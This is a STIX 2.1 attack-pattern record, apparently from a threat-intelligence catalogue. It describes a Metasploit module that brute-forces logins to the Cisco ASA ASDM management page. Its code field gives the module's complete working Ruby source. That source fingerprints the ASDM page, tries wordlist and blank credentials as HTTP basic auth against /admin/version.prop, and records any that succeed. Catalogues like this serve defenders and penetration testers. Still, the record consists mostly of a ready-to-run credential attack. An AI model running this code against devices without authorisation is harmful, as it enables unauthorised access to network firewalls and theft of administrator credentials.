{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1a2a2c1f-d3e0-4ed8-a37e-6f7e27d16ea6",
    "created": "2024-08-14T16:29:51.625191Z",
    "modified": "2024-08-14T16:29:51.625194Z",
    "name": "Cisco ASA ASDM Brute-force Login",
    "description": " This module scans for the Cisco ASA ASDM landing page and performs login brute-force to identify valid credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/cisco_asa_asdm_bruteforce.rb",
            "external_id": "cisco_asa_asdm_bruteforce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisco.com/c/en/us/products/security/adaptive-security-device-manager/index.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco ASA ASDM Brute-force Login',\n        'Description' => %q{\n          This module scans for the Cisco ASA ASDM landing page and performs login brute-force\n          to identify valid credentials.\n        },\n        'Author' => [\n          'jbaines-r7'\n        ],\n        'References' => [\n          [ 'URL', 'https://www.cisco.com/c/en/us/products/security/adaptive-security-device-manager/index.html' ]\n        ],\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true,\n          'BLANK_PASSWORDS' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptPath.new('USERPASS_FILE', [\n          false, 'File containing users and passwords separated by space, one pair per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_userpass.txt')\n        ]),\n        OptPath.new('USER_FILE', [\n          false, 'File containing users, one per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_users.txt')\n        ]),\n        OptPath.new('PASS_FILE', [\n          false, 'File containing passwords, one per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')\n        ])\n      ]\n    )\n  end\n\n  def run_host(_ip)\n    # Establish the remote host is running Cisco ASDM\n    res = send_request_cgi('uri' => normalize_uri('/admin/public/index.html'))\n    return unless res && res.code == 200 && res.body.include?('<title>Cisco ASDM ')\n\n    print_status('The remote target appears to host Cisco ASA ASDM. The module will continue.')\n    print_status('Starting login brute force...')\n\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: 'Cisco ASA ASDM',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  # Brute-force the login page\n  def do_login(user, pass)\n    vprint_status(\"Trying username:#{user.inspect} with password:#{pass.inspect}\")\n    res = send_request_cgi({\n      'uri' => normalize_uri('/admin/version.prop'),\n      'agent' => 'ASDM/ Java/1.8.0_333',\n      'authorization' => basic_auth(user, pass)\n    })\n\n    # check if the user was forwarded to the version.prop file\n    if res && res.code == 200 && res.body.include?('asdm.version=') && res.body.include?('launcher.version=')\n\n      print_good(\"SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}\")\n      report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)\n\n      return :next_user\n    else\n      vprint_error(\"FAILED LOGIN - #{user.inspect}:#{pass.inspect}\")\n    end\n  end\nend\n"
}